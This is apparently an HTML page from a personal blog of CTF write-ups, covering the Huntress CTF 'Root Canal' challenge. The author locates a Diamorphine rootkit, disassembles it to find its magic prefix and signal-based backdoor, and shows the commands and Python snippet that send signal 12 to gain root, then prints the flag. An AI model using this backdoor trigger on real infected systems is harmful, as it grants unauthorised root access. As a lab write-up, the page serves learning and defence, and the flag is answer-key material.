@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>2025-10-31 · the-grizzly-bear</title>
+<meta name="description" content="2025-10-31 — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="huntress/2025-huntress-ctf/2025-10-31.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">Huntress CTF</a> &rsaquo; <a href="index.html">2025-Huntress-CTF</a></div>
+<h1 id="title">2025-10-31</h1>
+
+<h1 id="root-canal"><strong>📦 Root Canal</strong></h1>
+<p class="figure"><a class="img-link" href="2025-10-31/image.png"><img src="2025-10-31/image.png" alt="image.png" loading="lazy"></a></p>
+<pre><code>Initial Reconnaissance
+
+Found README.txt with hint: "fix your root canal" → wordplay on "root"
+Searched for SUID binaries (standard system binaries, nothing unusual)
+Discovered /opt/.diamorphine/ directory containing rootkit files
+
+Rootkit Analysis
+
+Identified Diamorphine rootkit was loaded (hidden from lsmod)
+Used strings on the kernel module to find magic prefix: "squiblydoo"
+Discovered the rootkit hides files/directories starting with "squiblydoo"
+
+Finding the Hidden Directory
+
+Attempted to create ~/squiblydoo → got "File exists" error
+Confirmed directory existed but was hidden by the rootkit
+Directory had 0000 permissions and was owned by root (inaccessible without root)
+
+Privilege Escalation
+
+Analyzed the rootkit binary with objdump and nm
+Found give_root and hacked_kill functions
+Disassembled hacked_kill to find signal numbers: 11, 12, 13 (not 63/64 as initially tried)
+Signal 12 (SIGUSR2) triggers the give_root function
+
+Exploitation
+
+Sent signal 12 to own process: os.kill(os.getpid(), 12) or kill -12 $$
+Successfully escalated to root (UID 0)
+Accessed hidden directory: ~/squiblydoo/
+Retrieved flag: flag{ce56efc41f0c7b45a7e32ec7117cf8b9}</code></pre>
+<pre><code>Found diamorphine</code></pre>
+<p class="figure"><a class="img-link" href="2025-10-31/image-1.png"><img src="2025-10-31/image-1.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2025-10-31/image-2.png"><img src="2025-10-31/image-2.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2025-10-31/image-3.png"><img src="2025-10-31/image-3.png" alt="image.png" loading="lazy"></a></p>
+<pre><code>found /home/ctf/squiblydoo exists and 0000 perms</code></pre>
+<p class="figure"><a class="img-link" href="2025-10-31/image-4.png"><img src="2025-10-31/image-4.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2025-10-31/image-5.png"><img src="2025-10-31/image-5.png" alt="image.png" loading="lazy"></a></p>
+<pre><code>module is loaded</code></pre>
+<p class="figure"><a class="img-link" href="2025-10-31/image-6.png"><img src="2025-10-31/image-6.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2025-10-31/image-7.png"><img src="2025-10-31/image-7.png" alt="image.png" loading="lazy"></a></p>
+<pre><code>cmp $0xc,%eax (line 4bd) - checks if signal is 12 (0xc in hex)
+cmp $0xd,%eax (line 4c6) - checks if signal is 13 (0xd in hex)
+cmp $0xb,%eax (line 4cb) - checks if signal is 11 (0xb in hex)
+
+So the rootkit is looking for signals 11, 12, or 13</code></pre>
+<p class="figure"><a class="img-link" href="2025-10-31/image-8.png"><img src="2025-10-31/image-8.png" alt="image.png" loading="lazy"></a></p>
+<pre><code>ctf@ip-10-1-12-129:~$ python3 &lt;&lt; 'EOF'
+&gt; import os
+&gt; import signal
+&gt; 
+&gt; # Send signal 12 to ourselves
+&gt; os.kill(os.getpid(), 12)
+&gt; print(f"UID after signal 12: {os.getuid()}")
+&gt; 
+&gt; if os.getuid() == 0:
+&gt;     print("[+] Got root!")
+&gt;     os.setuid(0)
+&gt;     os.setgid(0)
+&gt;     os.execv("/bin/bash", ["/bin/bash"])
+&gt; else:
+&gt;     print("[-] Still not root")
+&gt; EOF
+UID after signal 12: 0
+[+] Got root!
+ctf@ip-10-1-12-129:~$ ls -la ~/squiblydoo
+ls: cannot open directory '/home/ctf/squiblydoo': Permission denied
+ctf@ip-10-1-12-129:~$ kill -12 $$
+ctf@ip-10-1-12-129:~$ ls -la ~/squiblydoo
+total 12
+d--------- 2 root root 4096 Sep 26 14:12 .
+drwxr-xr-x 9 ctf  ctf  4096 Oct 31 13:32 ..
+---------- 1 root root   39 Sep 26 14:12 flag.txt
+ctf@ip-10-1-12-129:~$ cat ~/squiblydoo/flag.txt
+flag{ce56efc41f0c7b45a7e32ec7117cf8b9}</code></pre>
+<p class="figure"><a class="img-link" href="2025-10-31/image-9.png"><img src="2025-10-31/image-9.png" alt="image.png" loading="lazy"></a></p>
+<pre><code>flag{ce56efc41f0c7b45a7e32ec7117cf8b9}
+</code></pre>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
